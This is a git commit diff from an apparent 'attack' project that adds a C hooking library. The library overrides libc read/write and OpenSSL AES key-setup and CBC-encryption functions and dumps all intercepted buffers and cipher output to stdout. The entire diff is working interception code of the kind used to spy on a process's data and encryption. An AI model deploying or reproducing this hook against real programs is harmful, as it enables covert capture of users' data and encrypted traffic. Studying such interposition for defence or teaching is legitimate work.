047bdd7bc2d81c7f0c4c2247fde3e14f33c7ef26
jongsu253 <jongsu253@gmail.com>
2019-01-22 01:04:47 +0900

    Add crypto hooker

--- attack/hook.c
+++ attack/hook.c
@@ -7,40 +7,80 @@
 
 Hooker hooker;
 
-static void hook_init() {
-    static is_initialized = false;
-    if (is_initialized) {
-        return;
-    }
-
-    void* handle = dlopen("libc.so.6", RTLD_LAZY);
-    if (handle == NULL) {
-        perror("hook init failed.\n");
+static void hook_libc6() {
+	void* handle = dlopen("libc.so.6", RTLD_LAZY);
+	if (handle == NULL) {
+		perror("hook init failed.\n");
 		exit(-1);
-    }
+	}
 
-    hooker.read = dlsym(handle, "read");
-    hooker.write = dlsym(handle, "write");
+	hooker.read = dlsym(handle, "read");
+	hooker.write = dlsym(handle, "write");
 
-    dlclose(handle);
+	dlclose(handle);
+}
 
-    is_initialized = true;
+static void hook_crypto() {
+	void* handle = dlopen("libcrypto.so", RTLD_LAZY);
+	if (handle == NULL) {
+		perror("hook init failed.\n");
+		exit(-1);
+	}
+
+	hooker.AES_set_encrypt_key = dlsym(handle, "AES_set_encrypt_key");
+	hooker.AES_set_decrypt_key = dlsym(handle, "AES_set_decrypt_key");
+	hooker.AES_cbc_encrypt = dlsym(handle, "AES_cbc_encrypt");
+
+	dlclose(handle);
+}
+
+static void hook_init() {
+	static bool is_initialized = false;
+	if (is_initialized) {
+		return;
+	}
+
+	hook_libc6();
+	hook_crypto();
+
+	is_initialized = true;
 }
 
 ssize_t read(int fd, char* buf, size_t nbytes) {
-    hook_init();
+	hook_init();
 
-    ssize_t size = hooker.read(fd, buf, nbytes);
+	ssize_t size = hooker.read(fd, buf, nbytes);
 
-    hooker.write(1, buf, size);
+	hooker.write(1, buf, size);
 
 	return size;
 }
 
 ssize_t write(int fd, char* buf, size_t n) {
-    hook_init();
+	hook_init();
 
-    hooker.write(1, buf, n);
+	hooker.write(1, buf, n);
 
-    return hooker.write(fd, buf, n);
+	return hooker.write(fd, buf, n);
+}
+
+int AES_set_encrypt_key(const unsigned char* userKey, const int bits, AES_KEY* key) {
+	hook_init();
+
+	return hooker.AES_set_encrypt_key(userKey, bits, key);
+}
+
+int AES_set_decrypt_key(const unsigned char* userKey, const int bits, AES_KEY* key) {
+	hook_init();
+
+	return hooker.AES_set_decrypt_key(userKey, bits, key);
+}
+
+void AES_cbc_encrypt(const unsigned char* in, unsigned char* out, size_t length,
+		const AES_KEY* key, unsigned char* ivec, const int enc) {
+	hook_init();
+
+	hooker.AES_cbc_encrypt(in, out, length, key, ivec, enc);
+
+	hooker.write(1, out, length);
 }
--- attack/hook.h
+++ attack/hook.h
@@ -2,10 +2,16 @@
 #define __HOOK_H__
 
 #include <sys/types.h>
+#include <openssl/aes.h>
 
 typedef struct Hooker {
-    ssize_t (*read)(int fd, void* buf, size_t nbytes);
-    ssize_t (*write)(int fd, const void* buf, size_t n);
+	ssize_t (*read)(int fd, void* buf, size_t nbytes);
+	ssize_t (*write)(int fd, const void* buf, size_t n);
+	int (*AES_set_encrypt_key)(const unsigned char* userKey, const int bits, AES_KEY* key);
+	int (*AES_set_decrypt_key)(const unsigned char* userKey, const int bits, AES_KEY* key);
+	void (*AES_cbc_encrypt)(const unsigned char* in, unsigned char* out, size_t length,
+			const AES_KEY* key, unsigned char* ivec, const int enc);
 } Hooker;
 
 #endif /* __HOOK_H__ */
+
